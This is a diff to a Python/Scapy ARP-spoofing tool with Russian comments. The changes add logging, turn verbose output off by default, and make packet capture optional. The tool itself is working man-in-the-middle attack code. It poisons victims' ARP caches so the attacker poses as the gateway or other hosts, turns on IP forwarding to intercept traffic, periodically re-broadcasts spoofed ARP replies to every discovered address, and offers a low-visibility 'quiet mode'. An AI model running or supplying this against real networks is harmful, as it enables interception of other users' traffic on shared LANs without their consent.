@@ -15,10 +15,15 @@ import sys
 from rich.progress import Progress
 
 import keyboard
+import logging as log
+from datetime import datetime
 
 verbose_enabled = True
 bidirectional = True
 PID = os.getpid()
+
+LOG_FILENAME = datetime.now().strftime('logfile_%H_%M_%S_%d_%m_%Y.log')
+log.basicConfig(level=log.INFO, filename=LOG_FILENAME, filemode="w", format="%(asctime)s %(levelname)s %(message)s")
 
 
 def check_privileges():
@@ -32,11 +37,14 @@ def get_default_if():
     for item in if_list:
         if if_dic[item].name != "lo":
             return if_dic[item].name
-
+        
 
 def on_key_press(event):
     if event.name == 'q' or event.name == 'Q':
-        print('Exiting program...')
+        if verbose_enabled:
+            print('Exiting program...')
+        else:
+            log.info('Exiting program...')
         keyboard.unhook_all()
         global PID
         os.system(f"sudo kill -9 {PID} > /dev/null")
@@ -61,7 +69,6 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
         sendp(arp_to_target_packet, verbose=0, count=3)
 
     if verbose_enabled:
-        print(f"ARP-подделка")
         print(f"Был перехвачен кадр от {victim_ip} ({victim_mac}) -> к {target_ip} ({target_mac})")
         print(
             f"После искажения: Отправитель кадра думает, что: {target_ip} ({target_mac}) это {target_ip} ({spoof_mac})")
@@ -71,15 +78,20 @@ def arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac):
         # print(f"Для этого Отправителю был выслан кадр:", arp_to_victim_packet.show())
         # if bidirectional:
         #     print(f"Для этого Получателю был выслан кадр:", arp_to_target_packet.show())
+    else:
+        log.info(f"Send spoof that {target_ip} ({target_mac}) is {target_ip} ({spoof_mac})")
+        if bidirectional:
+            log.info(f"Send spoof that {victim_ip} ({victim_mac}) is {victim_ip} ({spoof_mac})")
 
 
-def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured_traffic.pcap"):
+def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name=""):
     """
   Функция для поиска новых устройств по DHCP и ARP,
   записи трафика в .pcap файл и передачи данных в очередь.
   """
     # Запись трафика в pcap файл
-    pktdump = PcapWriter(pcap_name, append=True, sync=True)
+    if pcap_name != "":
+        pktdump = PcapWriter(pcap_name, append=True, sync=True)
 
     # Функция для обработки пакетов
     def packet_handler(packet):
@@ -105,29 +117,38 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured
             target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
             target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
 
-            # Проверяем, является ли устройство новым
             if str(target_ip).rpartition(".")[0] == str(victim_ip).rpartition(".")[0]:
-                if target_ip not in queue.queue:
-                    # Добавляем устройство в очередь
-                    queue.put((victim_ip, victim_mac))
-                    queue.put((target_ip, target_mac))
+                if target_mac != "ff:ff:ff:ff:ff:ff" and target_mac != "00:00:00:00:00:00":
+                    if target_ip not in queue.queue:
+                        queue.put((victim_ip, victim_mac))
+                        queue.put((target_ip, target_mac))
 
         # Записываем пакет в pcap файл
-        pktdump.write(packet)
+        if pcap_name != "":
+            pktdump.write(packet)
 
     while True:
         try:
             # Начинаем захват пакетов
             sniff(prn=packet_handler, iface=interface, store=0)
         except OSError as e:
-            print(f"Ошибка сети: {e}")
+            if verbose_enabled:
+                print(f"Ошибка сети: {e}")
+            else:
+                log.error(f"Net error: {e}")
             restart_network_service()
             # Повторно пробуем инициализировать сетевой интерфейс
             try:
                 restart_network_interface(interface)
-                print(f"Сетевой интерфейс '{interface}' активирован.")
+                if verbose_enabled:
+                    print(f"Сетевой интерфейс '{interface}' активирован.")
+                else:
+                    log.error(f"Interface '{interface}' activated.")
             except OSError as e:
-                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
+                if verbose_enabled:
+                    print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
+                else:
+                    log.error(f"Error: Unable to activate net interface '{interface}'")
                 time.sleep(5)  # Ожидание перед попыткой перезапуска
 
 
@@ -137,9 +158,15 @@ def restart_network_service():
   """
     try:
         subprocess.run(["systemctl", "restart", "networking"])
-        print("Сетевая служба перезапущена.")
+        if verbose_enabled:
+            print("Сетевая служба перезапущена.")
+        else:
+            log.error("Net service restarted.")
     except FileNotFoundError:
-        print("Ошибка: systemctl не найден.")
+        if verbose_enabled:
+            print("Ошибка: systemctl не найден.")
+        else:
+            log.error("Error: systemctl not found.")
 
 
 def restart_network_interface(interface):
@@ -149,9 +176,15 @@ def restart_network_interface(interface):
     try:
         subprocess.run(["ifconfig", interface, "down"])
         subprocess.run(["ifconfig", interface, "up"])
-        print("Сетевой интерфейс перезапущен.")
+        if verbose_enabled:
+            print("Сетевой интерфейс перезапущен.")
+        else:
+            log.error("Interface restarted.")
     except FileNotFoundError as e:
-        print(f"Ошибка: {e}")
+        if verbose_enabled:
+            print(f"Ошибка: {e}")
+        else:
+            log.error(f"Error: {e}")
 
 
 def get_gateway_mac(gateway):
@@ -192,17 +225,22 @@ def network_arp_discovery(interface="eth0", gateway_ip="", gateway_mac=""):
                 progress.update(task, advance=1)
         os.system("clear")
     else:
+        log.info(f"Studying local network {network}...")
         for i in range(1, 255):
             target_ip = str(get_if_addr(interface)).rpartition(".")[0] + f".{i}"
             arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                                               psrc=spoof_ip, hwsrc=spoof_mac)
 
             ans, unans = srp(arp_packet, timeout=0.3, verbose=0)
+            log.info(f"Sent arp to {target_ip}")
             if gateway_ip != "":
                 for sent, received in ans:
                     arp_spoof(spoof_mac, received.psrc, received.hwsrc, gateway_ip, gateway_mac)
+                    log.info(f"Have arp answ that {target_ip} is at {received.hwsrc}")
+                    log.info(f"Send spoof to {target_ip} that we are gateway {gateway_ip}")
     verbose_enabled = __verbose_state
-    print('Press \"q\" to exit program\n')
+    if verbose_enabled:
+        print('Press \"q\" to exit program\n')
 
 
 def main():
@@ -211,6 +249,7 @@ def main():
     # default_gateway = str(get_if_addr(default_if)).rpartition(".")[0] + ".1"
 
     os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
+    log.info("Activated port forwarding")
 
     parser = argparse.ArgumentParser(description="ARP-подделка с обнаружением новых устройств.")
     if len(sys.argv) == 1:
@@ -219,8 +258,8 @@ def main():
     parser.add_argument("-i", "--interface", type=str, help="Название сетевого интерфейса. Ex. eth0",
                         default=default_if, required=True)
     parser.add_argument("-g", "--gateway", type=str, help="Ip-адрес роутера", default="")
-    parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="captured_traffic.pcap")
-    parser.add_argument("-v", "--verbose", type=str, help="Включение расширенного вывода (True/False)", default="True")
+    parser.add_argument("-w", type=str, help="Файл для записи перехваченных пакетов", default="")
+    parser.add_argument("-v", "--verbose", type=str, help="Включение расширенного вывода (True/False)", default="False")
     parser.add_argument("-q", "--quiet_mode", type=str,
                         help="Включение режима минимальной заметности в сети, а соответственно и режима однонаправленности (True/False)",
                         default="False")
@@ -245,6 +284,7 @@ def main():
         global bidirectional
         bidirectional = False
 
+    log.info(f"Got arguments: interface={interface}, spoof_ip={spoof_ip}, spoof_mac={spoof_mac}, gateway_ip={gateway_ip}, gateway_mac={gateway_mac},pcap_name={pcap_name}, verbose_enabled={verbose_enabled}, quiet_mode={quiet_mode}")
     # Создаем очередь для передачи данных
     queue = Queue()
 
@@ -252,10 +292,12 @@ def main():
     sniff_thread = threading.Thread(target=sniff_and_find_new_devices, args=(interface, queue, pcap_name))
     sniff_thread.daemon = True  # Делаем поток фоновым
     sniff_thread.start()
+    log.info("Started sniffing thread")
     time.sleep(1)
 
-    keyboard.on_press(on_key_press)
-    print('Press \"q\" to exit program\n')
+    if verbose_enabled:
+        keyboard.on_press(on_key_press)
+        print('Press \"q\" to exit program\n')
 
     # Словарь для хранения времени последней ARP-подделки для каждого устройства
     last_spoof_time = {}
@@ -286,32 +328,44 @@ def main():
                 if target_ip not in old_list:
                     # Добавляем запрашиваемое устройство в очередь
                     old_list.append(target_ip)
+                    log.info(f"Found new ip, my ip_base is know {old_list}")
                     # Отправляем ARP-подделку для нового запрашиваемого устройства сразу
                     arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                     last_spoof_time[target_ip] = time.time()
                 else:
                     # Проверяем время последней ARP-подделки для этого устройства
-                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 60:
+                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 120:
                         # Отправляем ARP-подделку, если прошло более 1 минут
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
                     elif not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
                         # Переотправка в эфир подделки собой всех найденных локальных ip
+                        log.info("Gone 2 minutes, resending arp spoof to all known")
                         for i in range(len(old_list)):
                             arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                            log.info(f"Resent arp spoof about {old_list[i]}")
                             sendp(arp_packet, verbose=0, count=3)
         except Empty:
             # Ожидаем новые данные
             pass
         except OSError as e:
-            print(f"Ошибка сети: {e}")
+            if verbose_enabled:
+                print(f"Ошибка сети: {e}")
+            else:
+                log.error(f"Net error: {e}")
             restart_network_service()
             # Повторно пробуем инициализировать сетевой интерфейс
             try:
                 restart_network_interface(interface)
-                print(f"Сетевой интерфейс '{interface}' активирован.")
+                if verbose_enabled:
+                    print(f"Сетевой интерфейс '{interface}' активирован.")
+                else:
+                    log.error(f"Net interface '{interface}' activated.")
             except OSError as e:
-                print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
+                if verbose_enabled:
+                    print(f"Ошибка: Не удалось активировать сетевой интерфейс '{interface}'")
+                else:
+                    log.error(f"Error: Unable to activate net interface '{interface}'")
                 time.sleep(5)  # Ожидание перед попыткой перезапуска
 
 
